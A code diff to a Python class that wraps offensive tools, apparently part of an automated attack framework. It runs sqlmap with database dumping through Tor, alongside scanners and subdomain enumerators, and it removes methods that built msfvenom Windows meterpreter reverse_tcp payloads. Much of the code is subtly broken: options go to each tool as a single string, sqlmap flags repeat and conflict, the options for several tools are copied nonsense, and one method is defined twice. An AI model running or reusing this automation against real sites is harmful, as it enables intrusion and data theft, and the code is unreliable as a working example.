@@ -221,159 +221,139 @@ class Wrappers:
     def sqlmap(self, host):
         self.host_set(host)
         self.sqlmap_options = '-u ' + self.url + " --batch --random-agent --threads 10 --level 3 --risk 3 --timeout 10 --smart --dbs --tamper=url --dbs --dbms=mysql --dbms=mssql --dbms=oracle --dbms=postgres --dbms=sqlite --dbms=sqlserver --dbs --tables --columns --forms --dump --dbs --sql-query --tor --tor-type=socks5 --tor-port=9050 --tor-control-port=9051"
-        self.sqlmap_output = subprocess.check_output(self.sqlmap_options, shell=False)
+        self.sqlmap_output = subprocess.Popen(['sqlmap', self.sqlmap_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def fimap(self, host):
         self.host_set(host)
         self.fimap_options = '-u ' + self.url + ' -t 10 -m 10 -o ' + self.host + '_fimap.txt'
-        self.fimap_output = subprocess.check_output(self.fimap_options, shell=False)
+        self.fimap_output = subprocess.Popen(['fimap', self.fimap_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+         
+
 
     def joomscan(self, host):
         self.host_set(host)
         self.joomscan_options = '-u ' + self.url + ' -t 10 -m 10 -o ' + self.host + '_joomscan.txt'
-        self.joomscan_output = subprocess.check_output(self.joomscan_options, shell=False)
+        self.joomscan_output = subprocess.Popen(['joomscan', self.joomscan_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def jexboss(self, host):
         self.host_set(host)
         self.jexboss_options = '-u ' + self.url + ' -t 10 -m 10 -o ' + self.host + '_jexboss.txt'
-        self.jexboss_output = subprocess.check_output(self.jexboss_options, shell=False)
+        self.jexboss_output = subprocess.Popen(['jexboss', self.jexboss_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def sublist3r(self, host):
         self.host_set(host)
         self.sublist3r_options = '-d ' + self.host + ' -o ' + self.host + '_sublist3r.txt'
-        self.sublist3r_output = subprocess.check_output(self.sublist3r_options, shell=False)
+        self.sublist3r_output = subprocess.Popen(['sublist3r', self.sublist3r_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def nuclei(self, host):
         self.host_set(host)
         self.nuclei_options = '-t ' + self.nuclei_threads + ' -v ' + self.nuclei_verbosity + ' -e ' + self.nuclei_engine + ' -m ' + self.nuclei_modules + ' -o ' + self.host + '_nuclei.txt'
-        self.nuclei_output = subprocess.check_output(self.nuclei_options, shell=False)
+        self.nuclei_output = subprocess.Popen(['nuclei', self.nuclei_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def wpscan(self, host):
         self.host_set(host)
         self.wpscan_options = '-u ' + self.url + ' --batch --disable-tls-checks --disable-tls-fingerprint --disable-color --log ' + self.host + '_wpscan.txt'
-        self.wpscan_output = subprocess.check_output(self.wpscan_options, shell=False)
+        self.wpscan_output = subprocess.Popen(['wpscan', self.wpscan_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def dirsearch(self, host):
         self.host_set(host)
         self.dirsearch_options = '-u ' + self.url + ' -w ' + self.dirsearch_db_big_ext + ' -x ' + self.dirsearch_db_big_all + ' -x ' + self.dirsearch_db_big_all_ext + ' -x ' + self.dirsearch_db_small_ext + ' -x ' + self.dirsearch_db_small_all + ' -x ' + self.dirsearch_db_small_all_ext + ' -o ' + self.host + '_dirsearch.txt'
-        self.dirsearch_output = subprocess.check_output(self.dirsearch_options, shell=False)
+        self.dirsearch_output = subprocess.Popen(['dirsearch', self.dirsearch_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def httpx(self, host):
         self.host_set(host)
         self.httpx_options = '-u ' + self.url + ' -o ' + self.host + '_httpx.txt'
-        self.httpx_output = subprocess.check_output(self.httpx_options, shell=False)
+        self.httpx_output = subprocess.Popen(['httpx', self.httpx_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def dirb(self, host):
         self.host_set(host)
         self.dirb_options = '-u ' + self.url + ' -w ' + self.dirb_db_big_ext + ' -w ' + self.dirb_db_big_all + ' -w ' + self.dirb_db_big_all_ext + ' -w ' + self.dirb_db_small_ext + ' -w ' + self.dirb_db_small_all + ' -w ' + self.dirb_db_small_all_ext + ' -o ' + self.host + '_dirb.txt'
-        self.dirb_output = subprocess.check_output(self.dirb_options, shell=False)
+        self.dirb_output = subprocess.Popen(['dirb', self.dirb_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def gobuster(self, host):
         self.host_set(host)
         self.gobuster_options = '-u ' + self.url + ' -w ' + self.gobuster_db_big_ext + ' -w ' + self.gobuster_db_big_all + ' -w ' + self.gobuster_db_big_all_ext + ' -w ' + self.gobuster_db_small_ext + ' -w ' + self.gobuster_db_small_all + ' -w ' + self.gobuster_db_small_all_ext + ' -o ' + self.host + '_gobuster.txt'
-        self.gobuster_output = subprocess.check_output(self.gobuster_options, shell=False)
+        self.gobuster_output = subprocess.Popen(['gobuster', self.gobuster_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def whatweb(self, host):
         self.host_set(host)
         self.whatweb_options = '-v -a 3 -t 100 -k -o ' + self.host + '_whatweb.txt ' + self.host
-        self.whatweb_output = subprocess.check_output(self.whatweb_options, shell=False)
+        self.whatweb_output = subprocess.Popen(['whatweb', self.whatweb_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def assetfinder(self, host):
         self.host_set(host)
         self.assetfinder_options = '-subs-only -subs-url ' + self.url + ' -subs-list ' + self.assetfinder_db_big_ext + ' -subs-list ' + self.assetfinder_db_big_all + ' -subs-list ' + self.assetfinder_db_big_all_ext + ' -subs-list ' + self.assetfinder_db_small_ext + ' -subs-list ' + self.assetfinder_db_small_all + ' -subs-list ' + self.assetfinder_db_small_all_ext + ' -o ' + self.host + '_assetfinder.txt'
-        self.assetfinder_output = subprocess.check_output(self.assetfinder_options, shell=False)
+        self.assetfinder_output = subprocess.Popen(['assetfinder', self.assetfinder_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def subfinder(self, host):
         self.host_set(host)
         self.subfinder_options = '-d ' + self.host + ' -o ' + self.host + '_subfinder.txt'
-        self.subfinder_output = subprocess.check_output(self.subfinder_options, shell=False)
+        self.subfinder_output = subprocess.Popen(['subfinder', self.subfinder_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def waybackurls(self, host):
         self.host_set(host)
         self.waybackurls_options = '-d ' + self.host + ' -o ' + self.host + '_waybackurls.txt'
-        self.waybackurls_output = subprocess.check_output(self.waybackurls_options, shell=False)
+        self.waybackurls_output = subprocess.Popen(['waybackurls', self.waybackurls_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def theharvester(self, host):
         self.host_set(host)
         self.theharvester_options = '-d ' + self.host + ' -l 100 -b all -f ' + self.host + '_theharvester.txt'
-        self.theharvester_output = subprocess.check_output(self.theharvester_options, shell=False)
+        self.theharvester_output = subprocess.Popen(['theharvester', self.theharvester_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def amass(self, host):
         self.host_set(host)
         self.amass_options = 'enum -d ' + self.host + ' -o ' + self.host + '_amass.txt'
-        self.amass_output = subprocess.check_output(self.amass_options, shell=False)
+        self.amass_output = subprocess.Popen(['amass', self.amass_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def sublist3r(self, host):
         self.host_set(host)
         self.sublist3r_options = '-d ' + self.host + ' -o ' + self.host + '_sublist3r.txt'
-        self.sublist3r_output = subprocess.check_output(self.sublist3r_options, shell=False)
+        self.sublist3r_output = subprocess.Popen(['sublist3r', self.sublist3r_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def dnsrecon(self, host):
         self.host_set(host)
         self.dnsrecon_options = '-d ' + self.host + ' -o ' + self.host + '_dnsrecon.txt'
-        self.dnsrecon_output = subprocess.check_output(self.dnsrecon_options, shell=False)
+        self.dnsrecon_output = subprocess.Popen(['dnsrecon', self.dnsrecon_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def nikto(self, host):
         self.host_set(host)
         self.nikto_options = '-host ' + self.host + ' -Format htm -output ' + self.host + '_nikto.txt'
-        self.nikto_output = subprocess.check_output(self.nikto_options, shell=False)
+        self.nikto_output = subprocess.Popen(['nikto', self.nikto_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def nmap(self, host):
         self.host_set(host)
         self.nmap_options = '-sV -Pn -p- -oN ' + self.host + '_nmap.txt ' + self.host
-        self.nmap_output = subprocess.check_output(self.nmap_options, shell=False)
+        self.nmap_output = subprocess.Popen(['nmap', self.nmap_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def httprobe(self, host):
         self.host_set(host)
         self.httprobe_options = '-c -t 100 -p ' + self.host + '_httprobe.txt ' + self.host
-        self.httprobe_output = subprocess.check_output(self.httprobe_options, shell=False)
+        self.httprobe_output = subprocess.Popen(['httprobe', self.httprobe_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def massdns(self, host):
         self.host_set(host)
         self.massdns_options = '-r ' + self.massdns_db_big_ext + ' -r ' + self.massdns_db_big_all + ' -r ' + self.massdns_db_big_all_ext + ' -r ' + self.massdns_db_small_ext + ' -r ' + self.massdns_db_small_all + ' -r ' + self.massdns_db_small_all_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
-        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False) 
+        self.massdns_output = subprocess.Popen(['massdns', self.massdns_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def massdns_big(self, host):
         self.host_set(host)
         self.massdns_options = '-r ' + self.massdns_db_big_ext + ' -r ' + self.massdns_db_big_all + ' -r ' + self.massdns_db_big_all_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
-        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
-
+        self.massdns_output = subprocess.Popen(['massdns', self.massdns_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
     def massdns_small(self, host):
         self.host_set(host)
         self.massdns_options = '-r ' + self.massdns_db_small_ext + ' -r ' + self.massdns_db_small_all + ' -r ' + self.massdns_db_small_all_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
-        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
+        self.massdns_output = subprocess.Popen(['massdns', self.massdns_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def massdns_big_ext(self, host):
         self.host_set(host)
         self.massdns_options = '-r ' + self.massdns_db_big_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
-        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
+        self.massdns_output = subprocess.Popen(['massdns', self.massdns_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def massdns_big_all(self, host):
         self.host_set(host)
         self.massdns_options = '-r ' + self.massdns_db_big_all + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
-        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
-
-#start_metasploit
-#================
-    def msf_venom(self, host):
-        self.host_set(host)
-        self.msf_venom_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_venom.exe'
-        self.msf_venom_output = subprocess.check_output(self.msf_venom_options, shell=False)
-    
-    def msf_listener(self, host):
-        self.host_set(host)
-        self.msf_listener_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_listener.exe'
-        self.msf_listener_output = subprocess.check_output(self.msf_listener_options, shell=False)
-
-    def msf_payload(self, host):
-        self.host_set(host)
-        self.msf_payload_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_payload.exe'
-        self.msf_payload_output = subprocess.check_output(self.msf_payload_options, shell=False)
-    
-    def msf_payload_listener(self, host):
-        self.host_set(host)
-        self.msf_payload_listener_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_payload_listener.exe'
-        self.msf_payload_listener_output = subprocess.check_output(self.msf_payload_listener_options, shell=False)
+        self.massdns_output = subprocess.Popen(['massdns', self.massdns_options], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 #================
     
 #OVERKILL XD
